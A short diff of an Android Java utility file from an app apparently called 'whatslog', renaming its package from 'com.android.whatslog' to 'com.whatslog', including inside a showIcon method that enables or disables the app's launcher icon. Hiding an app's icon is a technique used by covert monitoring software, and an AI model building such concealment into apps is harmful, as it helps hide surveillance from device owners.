@@ -1,4 +1,4 @@
-package com.android.whatslog;
+package com.whatslog;
 
 import java.io.File;
 import java.io.FileInputStream;
@@ -165,7 +165,7 @@ public class Utils {
 	}
 
 	public static void showIcon(boolean show,Context ctx){
-		ComponentName componentToDisable = new ComponentName("com.android.whatslog", "com.android.whatslog.activities.MainActivity");
+		ComponentName componentToDisable = new ComponentName("com.whatslog", "com.whatslog.activities.MainActivity");
 		PackageManager p = ctx.getPackageManager();
 		if(show)
 			p.setComponentEnabledSetting(componentToDisable, PackageManager.COMPONENT_ENABLED_STATE_DEFAULT, PackageManager.DONT_KILL_APP);
